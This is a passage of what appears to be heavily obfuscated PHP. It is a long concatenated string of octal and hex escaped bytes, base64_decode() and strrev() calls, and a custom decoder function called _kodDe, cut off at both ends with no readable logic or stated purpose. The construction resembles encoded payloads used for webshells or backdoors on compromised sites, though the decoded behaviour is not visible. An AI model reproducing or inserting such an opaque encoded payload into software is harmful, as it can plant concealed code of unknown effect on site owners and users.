77\323\256\7\327\356\274\156\375\266\173\156\332\261\341\364\355\153\356\332\166\377\205\333\117\273\174\373\332\263\167\234\177\346\266\115\33\120\371\35\247\211"."\226\121\261\355\67\135\204\353\76\160\362\366\173\356\331\165\305\165\74\367\375\7\176\116\73\63\16\47\127\213\356\140\303\101\246\373\105\146\107\131\240\0\100\352\166\100\351\310".base64_decode('6miGFbJJsaKYg3C24hCFMQ39y5t5PwU4apRpK0YeZytsbQIcKJN6roBBC2YpSA23').strrev('eÙî‹ãœ,˜â…ı˜SU¥:™	CW¥CRÃÜ¸AÂªµ‹\\ğ¬Qšf›•üãš\\')."\x97\x95\x77\x83\x2d\x6d\x1f\x17\xde\xb\x99\x32\x74\x4c\xb2\x3\xa0\x17\x38\x25\x20\x45\x76\x95\x1b\x25\xb8\xf6\x9b\x1b\x99\xc8\x59\xee\x99\x0\xa1\x2f\xd1\x3d\xf0\x29\xb4\x2b\x3e\x85\xdc\x38".base64_decode('K24rRaxLwO7n5T0md9/SC1np7qkwVnYS5d7I192eoSXKTCMfnCsT7euiU6agPNuy').base64_decode('kNkwG7MI0Yk7UqINIIZBo0K4jT7E8aSlZwym4KznSElmNEBE6lyzOo22gOW6GZu/')."\xb0\xd0\x5f\xc0\x36\xde\xce\xbc\x85\x60\x4b\xa\x37\x8d\xaa\xf4\x5d\x8\xb\xb3\x15\x39\x35\xeb\xbd\x6d\xe3\x1b\xa6\xa9\x41\xb2\xb4\xc6\xc5\xea\xfc\x7e\xbf\x24\x35\x16\x2a\x6d\x38\x4\xcd\x89".strrev('Í¢¹˜nâlÌQ³3Ù'."\0".' Ô	Î ª™LÄu;nŸ_y¶›®&ô¢y»Æ”h[')."\314\62\46\5\146\0\161\143\317\3\305\222\171\4\227\324\113\335\207\164\121\13\35\357\54\25\5\121\221\170\61\217\127\270\316\75\146\75\237\221\52\315\323\322\216\324\252\332"."\13\223\32\20\363\241\115\25\371\172\346\50\130\30\151\226\106\240\0\253\333\346\136\167\64\176\77\7\5\264\274\210\134\310\330\104\41\26\116\34\150\322\226\214\143\343\2\212".base64_decode('cHUyXV9T1ZGXvIBIkjzXhLWzGrvFtBGdYuR1Dn9Fm1+0YK1xFZ3l7NRDsKpmDMiM')."\106\32\324\246\110\134\154\165\265\120\364\22\151\262\67\202\120\107\104\115\44\142\22\311\106\154\361\226\251\213\143\115\152\143\54\266\70\2\140\10\23\137\47\141\112\154\273\45"."\356\257\161\114\330\160\341\53\37\131\173\115\46\105\260\271\70\76\156\23\12\350\200\42\170\157\154\15\305\271\346\375\314\300\264\100\215\50\213\76\250\142\3\204\172\146\232\232"."\110\206\342\145\234\6\120\147\2\260\50\340\100\0\52\264\306\226\52\215\261\150\147\133\173\202\332\312\323\364\366\230\224\117\364\253\41\233\271\24\50\315\206\346\303\35\321\120"."\x63\x58\x89\xb4\x27\x63\xcc\x80\x82\xab\xb8\x12\xd3\x99\x4\x8f\xb3\x29\xb0\x6c\x9d\xbb\xc\x80\xfa\x34\x22\x9b\xf7\xc8\x2d\xf2\x96\x0\x8c\xbb\x7c\x95\xdd\x15\xdd\x53\xba\xab\xba\xab\x57\x4".base64_decode('uu2eoHR2GfLyQKSjCYZXx0MZGzZwWyJxLNiDxeKhxijrCiLgIRhrjNDAzl/euu2+').strrev('×—ó¸=6ÛİóuÙB²'."\0".'Î;ÍåøígÍÎÆxÙ<˜*‘º¿ää¸í'."\r".'DÏÓöãzşv³').base64_decode('bd940Y4L7915yS9oxlvX37p93XW8Y8pb52/ecdY1nGShlIoP1X5rzZk7N23EBMtV').base64_decode('J+24c/2ODWduX3fF9ouv23nWzduvPGX7qWfuuvmCo7yARONdbCnApDJ4PLYgpdPb').strrev('¯®Û18°5üK¨—T!'."\n".'ÂßÁG$ßkØc{pÎØøÕDåjeú=°«~[SÅOm')."\x9c\xb0\x17\xab\x60\xfd\xa5\x4e\x49\x9d\x69\xa\x27\x1a\xe3\x91\x86\x30\x68\xfc\xf3\x85\x9a\x44\xe8\x2b\x50\xa4\x40\xa9\x89\xf8\x12\x1e\xe6\x26\x7d\x25\xfe\x31\x94\x2a\x6\xcc\xd5\x8a\x6b\x20".strrev('Ğgœjš¾i¾•åÊáÕ'."\n".'¯[F‚QC>JVÆ"ø|*GUR¬é<¹‹fm Z')."\32\340\62\103\251\0\305\163\136\317\365\21\137\312\25\253\361\115\253\126\52\12\203\25\320\57\61\257\250\367\52\55\151\53\232\257\12\72\54\167\127\224\105\330\314\166\54\315"."\100\350\115\111\373\170\22\257\217\176\135\156\60\322\1\121\203\256\23\52\341\115\123\102\355\115\356\222\324\173\106\107\45\121\302\114\7\34\156\235\317\226\271\262\132\111\201\35"."\x45\x99\x4c\x52\xcd\x35\x19\xf5\xae\xc9\xa8\x9a\xa\x78\xa2\xa3\x85\xaf\x37\x35\x92\x50\xa8\xd\x1d\xed\x96\x66\xb3\x85\x82\x54\xb2\x54\x38\x95\xae\x16\x2b\x6b\xa2\x61\xa0\xc5\xa1\xe5\x51\x80"."\xe7\x60\x73\x2\xde\x12\x42\x47\x3c\x83\xad\x20\x4e\xe7\x8b\x58\x26\x8f\xb8\x35\xa9\xa0\x34\x20\x1d\x67\xce\xee\x63\xa8\xe\xdc\x69\xb4\x2d\xe7\x63\x60\xb0\xac\x30\x62\x84\x3b\x45\xc1\xd6\x80"."\341\144\143\53\205\362\204\4\346\231\324\44\27\240\212\351\124\134\40\302\31\11\50\107\267\13\106\10\373\222\162\221\366\346\130\274\215\132\301\45\32\133\303\155\241\0\40\161"."\12\11\264\74\246\264\224\172\245\22\143\76\232\124\351\232\176\362\41\66\145\111\362\125\264\257\124\7\221\115\164\26\12\175\320\31\130\175\205\330\67\153\244\112\175\45\165\104"."\0\115\162\357\75\261\170\122\105\23\0\350\131\302\272\225\322\151\41\351\217\143\143\256\141\306\1\364\42\72\310\144\376\27\62\51\46\56\105\215\343\66\33\143\355\315\21\146"."\360\327\4\374\165\41\143\272\12\65\305\43\330\322\35\276\257\260\246\44\63\113\24\21\152\33\50\122\30\311\360\260\60\332\306\31\374\314\107\21\161\344\243\10\77\154\160\51"."\311\33\21\376\176\242\235\207\5\251\213\42\235\11\146\350\201\261\357\322\46\36\156\345\326\272\70\43\26\227\42\241\170\250\55\301\243\361\245\334\160\204\247\121\3\22\265\275".base64_decode('s01g/GhoCQKWmCBQGLauCkxZWN1NbfJokP4sYjFsp9SzssanzFpdDWWYFZvq9Bt5').base64_decode('RmvirxwbVaOxFhonXpLC+YzgRpQuBRG+SUH42uzo4rtBQTCsUENfpT22NCQc70gZ')."\220\42\374\360\4\217\357\352\36\351\16\40\142\301\136\41\154\354\232\32\24\106\206\64\22\156\236\62\375\120\73\304\216\321\25\76\70\61\324\254\331\307\234\150\40\204\310\310".base64_decode('Bfq7jAUIroQKiMUtZJmxHbXyU7tXdU/u9geoYSMmXrp9oktqeBk6YxMJl1WmSnzL')."\100\353\150\224\20\242\273\226\106\346\303\17\360\136\363\201\74\205\350\202\172\276\230\341\143\127\265\243\177\55\311\125\141\364\57\212\176\242\111\264\134\6\57\200\266\144\64\262"."\x38\xbc\xa\xff\x11\x19\xd5\x7c\x22\xa9\xfd\x92\xbb\x42\xa4\x7d\x15\xfa\x8b\x10\xcc\xaa\x48\xbb\xb7\xb1\x86\x70\x72\x69\x38\x4c\xb\xb0\x30\xfc\x8a\xa2\x8\xe1\xc0\x50\x25\x2f\x5a\xd8\x40\x0"."\xb2\x85\xc1\x0\x34\xad\xaa\x55\x64\x32\xfd\x3d\x53\xab\x55\x35\x68\x77\x2\xbc\x70\x6f\x6\x55\x95\x47\xd7\x54\xc2\x19\x12\x4a\x34\xa\xec\xeb\x2\x88\x52\x58\x20\xea\xfc\x6e\x40\xe0\xbe\xa1"."\x20\xde\x12\x8f\x75\x76\x48\xf1\xd6\xd0\x92\x48\x7b\xb\x8b\x5\xa7\xb0\xd0\x14\x68\x5a\x69\x8a\x24\xd0\x14\x35\x32\x60\x14\x2e\xab\xe4\x38\x10\x9c\x84\x2c\x92\xa9\x5e\x17\x48\x37\x21\xcc\x8e".base64_decode('IhLJjpkBipndu6yhMxJtkg3RcUE4UAhWhzNlEuscixOTdBbBU87CBNxYhMwBi9AJ')."\x60\x31\x32\x5d\x2c\x42\x5c\x63\xb1\x8\x19\x28\x8b\x60\xee\x24\xdc\xce\xf2\x10\x8f\x88\xf8\x3b\xc6\xf8\xf5\x6b\xc3\xdc\x92\x72\x5e\x26\x25\x79\x3d\xc0\x38\x38\x40\xe5\x64\xd8\xe1\x5\xe2\xe2"."\64\56\315\364\210\102\211\124\112\142\374\251\212\237\42\31\164\7\151\22\242\66\111\42\372\355\136\261\220\120\303\53\30\140\122\253\141\47\151\70\131\327\127\300\272\20\175\45".base64_decode('Qkw6pe8wkwoiA1RNSQ5NDmo5QUidqNAaBLxCeINVG4nol0bdLBTHSys4ZwSeGHzw').base64_decode('Cz3an/50Q5QJLcBMptIHhywzrXBzx93dFRPNFhRgcwbRChpltQx+5qX7sfcM1ckx').base64_decode('oTdhzoR4mYqoRbwpHuugFIgSaVaobwalkgq1K4G0aoyH8e6gpVheVaVLHLWgUgFD').strrev('BW –šFåøÅàÈ¢9¿vh·'."\n".'û@µ‰i)Hk"ö‚²¡SMUFdiR™xS{H­wjí')."\232\21\57\13\314\50\326\7\114\71\317\241\24\61\315\212\44\320\201\35\215\222\221\242\54\303\306\204\254\117\341\316\20\160\42\146\76\250\230\23\32\142\31\264\41\232\25\136"."\226\214\207\160\42\241\76\367\333\27\375\107\20\12\346\216\254\234\106\55\105\11\315\26\130\1\102\202\25\56\22\221\22\217\230\110\4\10\42\107\236\64\46\236\103\44\5\164".base64_decode('mmU5wmKgummsIx5pC8WXw5QJHgB2oJl12QuLiGF3Shbr7ajXsgU7XWOOYRE/yzAs')."\xea\xd\x6c\x0\xbc\xf2\x40\xf0\x50\x4f\x86\x2a\x37\x48\x66\x42\x94\x2a\x66\xd8\xeb\x63\x1\xe6\x18\x82\x18\x40\x31\x49\x55\xe\xa1\x1c\x1e\x13\xab\x6\xb0\xf\xab\x22\xe7\xca\x26\x5c\xc2\xd5"."\x22\x3e\x24\xf1\x22\x33\x6c\xdf\x1c\xea\x8c\xca\x29\x30\x55\xca\xe2\xf0\xf2\xaf\xd9\x23\xac\xa7\xe5\xf6\x8\xcb\x63\xe2\x18\xbe\xdb\x60\x3c\x55\x33\x61\x7c\xd4\x57\x45\x55\x2d\xe2\x49\x8b\x79".base64_decode('2+jLc0dv0Cs4WzuTMRWdH/EwxuYwIj6tUn8lvlteFGgGF+B+K79maKxMuaHx+lzy')."\24\156\157\211\264\207\353\333\306\42\211\120\233\302\72\16\262\65\354\336\155\16\264\23\211\251\121\104\23\253\262\370\54\22\3\41\157\40\45\73\52\121\205\277\223\200\46\324".strrev('O2•)…ÁÎfô\\{ê'."\n".'ãåµÂ˜¯$ÑÀsğˆ8.ˆ0­ÆİZ¢L4¹(«½')."\x57\x5d\x1f\xf7\xea\x56\xcb\xc9\x42\xcd\x5b\xdc\xdd\xb2\xbb\x62\x74\xe\xb9\x2a\x74\x4a\x7e\xa\x70\x65\x85\x7d\x90\xdc\xde\xe4\xdd\xdd\x43\xe7\x65\x56\xc5\x9e\x42\x10\x3b\xa8\xea\x62\x34\x39".base64_decode('3bb5HS5hfljQ6RduGmQPiU0NbOaKeSehZ0Gq3pQiSvLCtk3YD0nK8+RCRCwH9VXp').base64_decode('qQgtRfh4pVIiMSpcIuK7CNFmD2PhxSDHDXayeW/yeCfzZodu5Qxy6bJUmOvwfF0G')."\200\162\23\354\257\221\276\40\31\50\342\50\54\44\276\125\224\54\75\212\171\324\57\277\154\73\204\26\226\44\112\326\12\314\241\43\215\315\6\105\23\156\61\345\364\61\275\34"."\370\265\130\116\100\270\241\41\155\142\332\305\57\334\102\144\64\331\114\123\162\4\174\224\274\342\144\351\4\340\365\32\262\217\210\200\360\16\311\141\171\21\237\160\154\276\14\127".base64_decode('4ZgO7lWlvnTw8mnuBpjOhjTNJIEGye5T6kQnWlFPTWtMggEptY15TgLflFGzjyMO')."\104\36\202\177\60\27\362\210\304\240\156\100\307\266\113\324\222\4\133\232\361\212\324\67\326\67\127\352\224\334\163\116\260\337\313\326\153\204\202\374\203\26\221\345\174\363\7\343".base64_decode('ujiSUTViKvaNlQT+I18ilSSc6alDwJGatcDK90O2gDGEqNtjais6C2KMYjDspAv3')."\262\132\200\12\34\104\320\244\203\304\12\27\370\261\171\344\352\236\136\40\302\142\257\104\150\225\207\230\312\4\70\342\22\47\165\210\376\54\317\145\374\250\343\0\165\31\335\341"._kodDe('KoQCKiQKV6x/hsNmzVeCBbPXvSqUV6Akv+EaxRx1UIiVAgJ8rpljpQYswi6vZbUmIA==').base64_decode('UuPhxuX8FoOnNoeWeFMiWOQXaimbzAVROJ1wfGo8hiV24Wizp0KilTuIdKep0Uj7').base64_decode('4rIZiG5ok6rQxEgy3OZNc7eQCIfizLMojjdEY41SdiRWOhOcMOGJVN5HE4PHV3Wv')."\44\54\113\35\342\134\62\253\260\140\300\257\366\114\255\136\330\275\272\272\252\73\270\60\60\205\313\263\50\272\222\354\142\47\110\266\331\41\122\347\115\300\347\17\113\244\325\40".strrev(')æ|ËTê¾÷Ê­¥±T¤:ğf£ÕÈê	½¯'."\0".'€ì[/rì<#à')."\30\226\313\167\301\32\55\46\353\36\170\12\243\177\35\162\121\254\356\122\266\240\13\130\135\226\306\162\122\300\60\305\76\20\33\66\143\246\213\330\375\221\230\175\141\227\214\222"."\x2\xae\x26\x10\xaa\x1e\x14\xdc\x35\xec\xb7\x4\xdb\x97\x79\x74\xa\xc2\x31\xdb\x88\x88\xc5\x96\xd6\xc8\x31\x8b\xa3\x6d\xed\xb1\x8e\x63\xe3\x89\x64\xe7\x92\xa5\xcb\x96\x1f\x7\x33\xcd\xc0\xa1".base64_decode('V/Ez72Xg7DI4rFnBYeaueQmm9XU7KNNQPBGNEaE6hqiCVATAczFeCJbPoq0Fc3mn').base64_decode('ZoISHZaeMk1ngtwlbV/fMGR2dds9DP6CGX0YgkK/zBYcDpAPftltNAZVmaLLpDzn')."\74\44\10\315\106\211\32\20\211\304\210\123\370\120\315\3\305\63\306\156\73\210\353\260\106\223\177\246\226\51\2\56\367\347\374\231\356\144\13\366\205\331\175\34\207\15\303\222"."\x9c\x51\xa6\xcd\x7c\xc6\x90\xbc\x26\x68\x69\x46\xec\x15\xd3\x83\xdc\xf9\x0\x3e\x29\x6c\xff\x88\xc1\xa0\xef\x68\xce\x26\x82\x3e\x94\xaa\xa5\x29\xdb\x2c\xe9\x2\xe\xf9\x31\xd7\xe4\xd7\xb2\x7d"."\46\42\364\230\32\353\220\137\33\164\345\13\77\260\5\63\153\60\377\164\103\176\364\11\51\217\26\106\215\263\363\26\153\75\160\307\260\70\142\363\230\274\45\311\211\304\325\166".base64_decode('8LnX6sEGPJE7sE2QQdQpM8DLczOiwCWrUOZnV1BomKojjo1p1KcI//BMrEp5laM8')."\33\224\270\305\21\144\173\132\366\234\300\20\171\156\120\50\210\345\6\271\142\107\332\105\310\140\232\241\131\322\43\23\264\12\270\152\107\171\15\143\114\31\13\54\113\33\306\342"."\xd2\x4b\x13\x2e\xaf\x15\xb2\x73\xfb\xd0\xd2\xc4\xc\x7f\x6b\x5b\xa8\xd1\x8f\x8e\xa3\x5a\x66\x94\x80\x88\x80\xee\x24\xa2\x2\x18\x60\x69\x23\xf6\xc\xc6\xf8\xd0\x94\xa9\xb3\x94\x7e\xb4\x12\x0".strrev('•—wÌ­¸‡Œ;Æ¿Xò˜õ~§àQ4IÕ4Q…áX3ÒÚiÿÔ‰¦N»vbî¥1').base64_decode('/e6yct9d5vnustLv0iQPxGqFQmM/hgUX9nUlpeUIOwV7sXqPrBYEEliqFRxA2U2U')."\0\317\360\362\266\10\361\135\321\53\355\27\127\163\1\70\42\62\354\320\265\31\322\313\152\266\263\304\345\36\351\33\135\25\143\67\40\155\234\331\340\164\156\320\264\355\40\166".base64_decode('6Uioe67+FkuwOyb3mKhGkiQMAK9y3OMu98crnPbSqwEaDnNXN4hJCfVh7yYIz8Gs')."\204\107\13\246\255\313\76\240\63\72\161\61\312\315\371\45\327\312\71\155\24\143\42\246\25\50\71\131\146\56\213\145\377\216\170\302\374\71\227\123\370\121\77\32\272\307\115\261".base64_decode('reuDTHdRYli4UKKDux/2DgejAoEULe5wmt4q+8sm+CW3GBQbSO7LUb+gadxN2L/9').base64_decode('ZG6YRIP+HFdu1H5L+INGa0kfHVisjzFfy54d4HHP3N3S3dadlKfJsbTeXtRtyeOr')."\253\57\302\33\64\200\37\171\47\200\115\306\304\276\244\341\362\144\162\131\127\324\220\111\70\224\240\105\254\34\174\43\234\74\14\222\7\107\312\300\356\261\70\35\240\267\127\250"."\323\26\212\322\233\67\62\274\340\143\237\53\334\141\311\6\365\340\315\120\6\361\254\15\236\373\353\331\210\320\324\345\33\314\14\234\211\53\53\20\44\126\324\125\34\135\205\176"."\253\53\174\25\230\260\45\161\274\212\70\201\364\243\242\356\350\52\22\250\6\77\65\343\314\252\115\70\267\25\67\366\40\214\133\210\246\126\272\146\132\110\146\3\357\375\332\140"."\155\160\4\360\301\302\41\374\105\361\374\206\367\14\30\125\21\332\143\327\47\252\214\174\1\255\303\254\313\71\255\274\47\14\55\267\65\315\144\130\64\324\166\234\137\270\233\236".base64_decode('v3A0l1WAK62vrAlMq1TY8yz1lZ3JZv+cyoUL9pvfSC6dHb0N3xpjmQkVFiyAS6H5').strrev('0ˆL2´ílFà´Äguç€<&,rvdÃH*C¨èó7N_À.¨›ĞHñ{x')."\x7b\x2e\x2a\xa0\xaa\xc3\x72\x54\x36\xfc\xce\xc2\x58\x31\xef\xc7\x22\xb\x7f\x42\x76\x45\xe8\x79\x73\x60\x9a\xbb\x3c\x16\x3a\xb8\xcb\xcb\xa8\x31\x2d\xd0\x47\x4e\x4\xe9\xfb\x11\x75\x8a\xfc\xa8"."\210\344\137\231\10\264\350\256\144\312\41\220\206\261\46\113\22\30\264\127\50\365\143\224\250\272\121\342\42\117\177\361\124\373\21\321\205\341\37\155\52\164\374\72\172\271\42\356".strrev('”I?xÈÑgH®R '."\r".'5vË©±¢fFı}xıó.ÆÎ:EÊ—ë‹ÁTgxYï¼+—').base64_decode('GPzFIvtg2UZl/oEVIIOI8PZclLmG1poT417iXtAoWqkberR5ldrpdTPn1jFL0MlM')."\x7\xa3\x58\x60\x7a\xd5\x28\xc8\xdc\xd4\x1f\x15\xec\x65\x78\x40\x3c\x65\xc1\xc6\x86\x17\x5c\xf2\xeb\xef\x4a\x16\xd3\xc8\x77\x38\x43\x20\xae\x72\xa2\xb7\xae\x47\x52\x60\xa0\x94\xdf\x97\xde\x1f"."\40\222\166\272\223\260\146\222\312\137\151\50\203\111\21\363\306\16\14\70\166\45\163\62\276\40\175\54\140\361\362\232\330\42\251\354\240\30\111\12\253\220\3\204\17\242\216\232"."\202\314\42\107\256\54\306\356\57\346\7\353\245\114\305\61\115\45\247\345\307\200\33\230\144\327\115\262\347\341\17\325\143\345\171\33\105\0\137\163\357\274\370\34\21\276\24\251"."\x27\x20\xc8\xa1\xf7\xa\x1\xfc\xb8\x4a\x0\x1f\x52\xf1\x22\x94\xea\xc8\x16\xf9\xf3\x17\x5\x12\x86\x1e\x76\x44\x3b\x5b\x22\xed\x92\x2\x95\x94\xa0\x36\x36\xb5\xab\xa1\x8e\x8e\xb2\x19\x9c\x60"."\301\2\105\254\175\20\30\140\227\62\151\6\125\363\215\134\237\222\306\26\30\365\25\70\265\102\261\255\64\363\121\134\21\4\74\112\12\10\376\151\276\1\125\52\161\25\245\27"."\201\211\237\204\150\166\345\202\371\101\143\1\237\154\341\167\311\62\205\201\111\40\370\63\314\115\5\261\212\122\176\62\136\135\131\143\202\244\66\13\57\113\212\62\137\123\350\74"."\xd6\x57\x12\xb9\x79\xa5\xd2\x8f\xce\x63\xae\x9f\xb9\xc0\x5b\xb9\x9d\x5d\x5b\xcd\xf\x6a\x72\x26\xde\x59\x71\x93\x91\xbf\x9c\x89\x1a\xe6\x1e\x6\xcb\x5e\x7d\x84\x24\x8f\xe6\xe4\x61\x8b\x46\x2d"."\xbf\xa4\xb4\xa\x6e\x3c\x90\x96\xb3\xe8\x4a\x12\x13\x98\xd2\xf2\x41\x22\x39\x8\xa\x7e\xd1\x7d\x37\xc4\xaf\x52\xca\x0\x45\x41\x4b\xf\x62\x38\x12\x48\x1f\xbe\x4\x19\x1d\x98\x31\xa1\x19\xae"."\xf7\x19\x1c\x49\x31\xa4\x88\x8d\xc0\x88\x28\xde\x12\x8f\xc8\xac\x5c\x49\x1b\xc2\xe7\xfc\xea\xd5\xa5\x69\xa0\x5b\xea\xcd\xa\x15\xc\x6f\x12\x86\x17\x6f\x1a\x66\xb4\x45\x1a\x3a\xbd\xdc\x9f\xa1"."\260\52\27\22\51\254\14\375\25\165\242\355\55\42\102\31\21\127\146\27\123\343\46\261\356\256\312\300\224\325\253\203\6\323\300\142\332\42\254\156\200\227\246\361\356\200\273\74".base64_decode('GglMPS8ICd6SlGo8BrbcfsEpwnCNa1opWP2qvn5BF79o6mF5jPQzauawRR/v9yeX')."\xf2\x60\x63\xbb\x20\x6e\x85\x81\xaf\x3c\x6d\x1e\xb0\xa7\x18\x26\x40\x4\x28\x21\xb7\x7f\xe3\x85\xc3\xfc\xe9\x14\xb9\x2a\xd\x87\xa\x5\x39\x1a\x64\x11\x7c\x43\x91\x35\x52\x41\xbe\xff\xe9\xad"."\x45\x20\x2d\x6c\xc1\x58\x11\x82\x7d\x3c\xe9\x58\x85\xca\x93\x81\xcd\x8d\x49\xf2\x30\x42\x8f\x88\xe\x1b\xf0\xa6\xa3\xb6\x78\x22\xf\xcc\xb7\xd3\x96\x51\x70\x5c\x98\x8b\xbe\x96\x58\x41\x9e\xb6"."\x19\xd0\x86\x35\x5a\xa4\x42\x1\x8e\xbd\xbe\x82\xb8\xf6\xaf\x40\x98\x8a\xe6\x0\x8a\x10\x5d\x99\x8f\x51\x92\x62\xe9\xd9\xfa\xa\xd2\x5d\xbb\x5f\xd7\x51\x7d\x82\x74\xca\x7d\x4\x55\xac\x50\x18"."\xbe\xcc\x69\x7c\xc6\x2c\xc7\x44\x47\x21\xb7\x35\x82\x87\xa6\x3a\xe3\x60\x9c\x11\x6a\x87\x5b\xa1\x9f\x1d\x4f\x7f\x8f\xfe\x19\x83\x1e\xf2\xdc\x59\x56\xb7\xa8\xea\x39\x41\x40\xe4\x3e\xb2\x57\x88"."\267\340\301\253\216\170\54\31\153\144\357\3\225\223\203\315\140\244\254\115\355\347\4\313\303\14\210\270\206\6\53\301\211\203\40\244\300\272\133\305\174\236\53\273\141\152\221\237".base64_decode('YFh5Rj0mEWtn76kkOdhgw/CA0qWx+yvQkqUXcon+oiNOS/xIQBIbD9uQLLlNxE4b')."\121\103\135\124\154\131\77\215\331\211\60\35\72\141\110\6\45\313\264\101\105\310\111\256\243\246\347\135\322\20\372\355\254\311\74\111\326\116\233\66\315\77\255\6\375\317\264\254"."\231\377\272\72\346\175\104\52\62\155\132\35\371\237\146\20\201\56\54\212\73\7\41\6\206\321\240\300\210\256\103\207\340\220\310\31\371\42\43\260\272\32\261\271\230\202\273\326".strrev('à&*!õ¹@¤Éµh9ÑY¿ŞË'."\n".'Ã'."\0".'ß\'{¦!*.Bp¶$ó.C#ÁÄ´Ö'."\n".'hÃ')._kodDe('MAxW5CPVmviLIdXgS/C1YFqQV0beVdtsB3Pnlvd9Ml/70PMI2NGYCuRBd4++1Iuy0Q==').base64_decode('CZL0BBNtkjdMHJVvOkg2N+EjsSz3LICj7bwl+pAJ9XkAc1gGXPvNEVWc0Dh6DI+R').base64_decode('KcXsEwPDjGRmieeV4WOpOJc4CTUF0Log5vaDRtZlZKxKVeW5nYcLspEk3TVxQ2hH').base64_decode('h/hzLlQLkvVNga1Ho8R/NXmJjyqu1u1XsriOd2HJGlmmsBgu0T1iMWmlmPQ88Q3q')."\101\54\45\314\22\250\146\115\43\167\33\51\65\340\315\362\324\11\121\241\173\111\5\110\57\55\115\56\52\312\224\306\351\236\322\304\141\144\43\367\203\53\173\221\244\132\7\222".strrev('¬,à	‡½„ø‰ÉË—½âË%¥âó\'Ê;Ò†“Ën«CìË¬âXckš…ü~'."\r".'‹¦')."\x96\x35\xf1\x1c\xaf\x54\x54\xd0\x2a\x52\xa2\x7b\x37\x4b\x19\x8d\xfc\xd5\x25\x39\x11\x73\x6a\xb2\x62\x9\x51\x7\x76\xb7\x81\x59\x40\x77\xa\xef\xd9\xd7\x0\x1d\x63\xdd\x1d\x78\x3b\x55\x56\x86"."\xa4\xc5\x4\x46\xc2\x62\x15\x59\xf8\xab\xba\xc0\x84\xc1\x2a\xd3\x63\xc1\x33\x24\xee\x95\xdd\xe9\x34\x8d\x32\xd7\xae\xab\xa5\x24\x41\x74\x59\x9d\x3d\xe5\xa\xa8\x90\x6c\x2a\xdc\x0\xd1\xf7\xf1"."\114\252\330\10\260\165\353\353\345\152\356\274\67\117\75\227\5\316\147\245\360\264\162\331\240\54\64\307\123\252\312\162\17\274\243\133\371\13\242\145\0\321\15\154\45\120\105\350".base64_decode('A9xAHUeFUgy3DojMhxhAm4rofDhZoc9qKnmd24q7F1WuAG8fmYiewj5o5Uq4rU4P').base64_decode('ilrswoi8r12ks0yXTpkUqAU9v0nsMQOKj8WlcRCG3YWG1YMIfnGawIJ0UWzM2sRd')."\x86\x50\x86\xad\xcf\x50\x51\x67\x94\xba\x74\x4e\x28\x52\x23\x80\xb6\x93\xfd\x96\xe9\x70\xe\xf\xe7\x23\x38\x14\x91\xa8\x4c\xae\x25\x69\x15\xff\x2\xf1\x1d\xd7\x9d\xa2\xe4\xc8\x9b\x17\x45\xe7"."\72\373\272\306\316\172\242\220\106\34\241\113\114\247\47\352\125\337\43\347\262\303\216\126\346\31\135\150\266\341\145\114\110\372\116\145\276\0\225\170\25\40\30\54\75\155\132\104"."\xe6\x20\xb9\x94\xc8\x3b\x71\xbd\x4f\x8e\x46\x4d\x2e\x6b\xc1\x77\x58\x7a\x99\x26\xb0\x17\x1f\x69\x9b\x63\xa8\xf\xa5\x9d\xa2\xec\x13\x48\x72\xa0\x8e\x62\x92\xa7\x7c\x89\xf0\xf3\xd7\x28\x9c\x62"."\x54\x69\xcb\x34\x32\x55\xca\x20\xe5\xcb\x11\x8f\x1e\x89\x9f\x64\x4d\x42\x84\x1c\x89\x62\x8a\x5f\xbc\x78\x48\x3a\x66\xa0\xa2\xc8\x14\x13\xb3\x38\xc1\xd\x10\xf7\x2c\x78\x4\xb6\x9c\x87\x9a\xc5"."\x8e\x8c\xc5\xc8\xe4\x2a\xe4\x9b\x25\x55\x68\x1e\x26\x5a\x84\x93\x13\x39\xc7\xc6\x2e\xf0\x3b\xd9\xb2\x95\xcb\x29\xf3\x29\x92\x25\xcd\x68\x9a\xbb\x7d\x82\xd9\x11\x93\x4\x19\x63\x3a\x53\xf1\xf4"."\xd7\xd4\xfa\x99\xc7\x3f\xd9\x7a\x85\x71\xd\x80\xb7\xd1\x5e\x90\xc0\x0\x33\x58\xc\x6d\x80\x82\x24\x94\x13\x65\x4c\xe9\xfa\x8a\x38\x3e\x11\xee\x1e\x88\x8f\x17\xbe\x9e\xc4\x19\xc\x8f\x59\xd2"."\331\255\163\345\111\342\25\105\106\243\102\313\200\352\124\342\2\235\345\362\351\14\341\354\46\227\26\254\247\0\332\31\356\174\360\205\57\72\103\35\263\230\56\335\45\117\43\360"."\xe2\x82\xec\xed\x9f\xd4\x12\xe3\x10\xaa\xc0\x28\xc9\xa4\x1e\xf7\xa5\x89\x11\xda\x12\xd4\x5f\xc\xd3\x69\xe6\x78\x49\x24\x27\x4d\x9e\x58\xaa\x71\x81\xa1\x12\x9a\xa4\x76\xbd\xf0\x8\x69\x55\x35"."\266\353\165\311\270\332\306\270\365\45\326\237\302\207\42\327\175\265\345\10\313\345\300\151\273\42\124\137\314\125\233\47\361\122\43\72\63\321\145\262\230\216\326\216\40\117\152\340".base64_decode('25Oy6sJNVSNTytJHdWCoRnJGWonGWiKNoWhTJLFY6dMdRaiGkBcz3FuZCBzpxDOo')."\116\361\307\33\160\320\237\102\24\272\77\303\271\30\133\360\53\222\326\234\364\356\225\273\131\12\177\272\125\322\142\36\133\336\144\113\352\140\61\152\231\322\131\41\137\224\12\27"."\54\275\264\374\230\216\325\243\244\36\113\25\212\145\172\3\345\313\177\201\274\260\41\227\106\204\207\236\237\250\363\106\176\330\260\15\261\361\131\215\61\271\365\120\123\133\244\135"."\15\105\243\261\245\56\355\102\41\100\266\370\173\46\31\371\371\23\151\145\304\42\320\257\227\172\117\3\337\123\262\247\171\217\330\202\56\237\354\121\257\300\256\103\340\5\107\376"."\32\2\215\112\257\23\25\54\315\260\165\51\201\276\252\63\5\14\135\264\154\326\365\56\141\266\127\212\26\335\47\153\331\117\251\364\3\54\115\162\332\127\256\100\34\77\70\377"."\xbf\xee\xaa\x91\x11\xe\xb3\x8c\xc\xd3\xca\xe0\x76\x89\xf4\xa1\x84\x46\xf9\xd\x4b\xf6\xcd\x92\x17\x98\xbe\xf1\x2d\x27\x9f\xe4\x41\x91\xb8\x14\x62\x4f\xca\x99\x84\xfd\x0\xda\x98\xa6\x45\x62"."\52\165\203\50\76\201\30\143\153\254\40\337\340\5\63\101\76\305\64\200\375\2\206\331\265\21\216\10\106\0\27\207\326\360\347\50\173\210\270\136\54\344\142\54\3\323\26\105"."\x78\x2\xe6\xd9\x75\x83\xed\x79\x95\xca\xab\x58\xeb\x7a\x6\xbe\xe4\x1b\xe4\x49\x4\x9a\xd7\x85\x87\x83\x4a\xf6\x88\xc1\xa1\x18\x7f\xf2\